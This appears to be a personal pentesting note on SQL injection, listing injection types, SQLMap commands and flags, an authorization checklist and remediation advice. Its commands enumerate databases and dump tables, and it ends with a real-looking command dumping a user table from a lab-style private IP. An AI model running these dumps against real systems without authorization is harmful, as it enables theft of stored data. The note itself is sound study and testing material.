# Common SQLi types (one-line)

- **Boolean-based (blind):** infer data by comparing true/false responses.
    
- **Error-based:** force DB errors to leak info.
    
- **Time-based (blind):** infer data by causing delays.
    
- **UNION query:** append a `UNION SELECT` to retrieve rows/columns.
    

# Quick SQLMap commands (examples for _authorized_ testing)

```bash
# Interactive wizard (guided)
sqlmap --wizard

# Scan a GET parameter (example)
sqlmap -u 'http://example.test/search?cat=1'

# Enumerate database names
sqlmap -u 'http://example.test/search?cat=1' --dbs

# List tables in a specific database
sqlmap -u 'http://example.test/search?cat=1' -D <database> --tables

# Dump a table's rows
sqlmap -u 'http://example.test/search?cat=1' -D <database> -T <table> --dump

# Test using an intercepted POST request saved to a file
sqlmap -r intercepted_request.txt

# Help / flags reference
sqlmap --help
```

(Replace `example.test` and angle-bracketed tokens with your authorized target and names.)

# Useful flags (short)

- `--wizard` — interactive guided mode.
    
- `-u` — target URL.
    
- `-p` — specific parameter.
    
- `--dbs` — list databases.
    
- `-D <db> --tables` — list tables in db.
    
- `-T <table> --columns` — list columns.
    
- `--dump` — extract table rows.
    
- `-r <file>` — use saved raw HTTP request (for POST).
    
- `--batch` — non-interactive (use with care).
    

# POST-based testing

- Intercept the POST request (e.g., with Burp or a proxy) and save it as a raw request file. Pass that file with `-r`.
    
- Useful when parameters are not in the URL (login forms, APIs).
    

# Triage checklist

-  Confirm you have written authorization to test.
    
-  Avoid testing production systems unless scheduled & approved.
    
-  Capture logs and evidence of findings.
    
-  Sanitize/ redact sensitive data in reports.
    
-  Recommend fixes: parameterized queries, least-privilege DB accounts, input validation, disable verbose DB errors.
    

# Safety & ethics (must read)

- Performing SQLi against systems you do not own or lack permission for is illegal in many jurisdictions.
    
- Use SQLMap only on lab targets, local VMs, or explicitly authorized engagements (e.g., a signed pentest scope).
    
- Prefer non-destructive enumeration options and notify stakeholders when testing (especially time-based tests that can affect availability).
    

# Short remediation notes (for reports)

- Use prepared statements / parameterized queries.
    
- Principle of least privilege for DB users.
    
- Output-encode or redact DB errors from responses.
    
- Implement input validation (allowlists) and WAF/IDS monitoring.
    
- Regular SAST/DAST scans and pentests.
    

# Backlinks (place in your vault)

- `[[OWASP Top 10 - Injection]]`
    
- `[[Pentest - SQLi Checklist]]`
    
- `[[Lab - SQLMap practice VM]]`
    

---

Want this as an Obsidian template file (frontmatter + checklist pre-filled) or a one-line cheat-sheet card? Which format do you prefer?

# n3ambo lfa9r
╰─ sqlmap --flush-session \                                                        ─╯
  -u 'http://10.10.172.81/ai/includes/user_login?email=test@chatai.com&password=zadazdazd' \
  -D ai -T user --dump \
  --time-sec=5 --timeout=180 --threads=2 